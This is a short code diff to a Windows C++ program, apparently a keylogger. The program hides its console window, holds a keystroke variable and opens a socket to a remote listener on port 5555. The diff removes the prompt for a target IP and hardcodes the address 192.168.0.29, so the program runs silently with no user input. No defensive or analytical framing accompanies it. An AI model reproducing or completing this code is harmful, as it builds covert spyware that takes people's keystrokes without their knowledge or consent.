@@ -6,17 +6,10 @@
 #include <stdlib.h>
 #include <Windows.h>
 
-using namespace std;
-
 int main()
 {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     char KEY;
-    
-    string target;
-    cout << "Enter target IP Address: ";
-    cin >> target >> endl;
-    cin.ignore();
 
     WSADATA WSAData;
     SOCKET server;
@@ -24,7 +17,7 @@ int main()
 
     WSAStartup(MAKEWORD(2, 0), &WSAData);
     server = socket(AF_INET, SOCK_STREAM, 0);
-    addr.sin_addr.s_addr = inet_addr(target);
+    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
     addr.sin_family = AF_INET;
     addr.sin_port = htons(5555);
     connect(server, (SOCKADDR *)&addr, sizeof(addr));
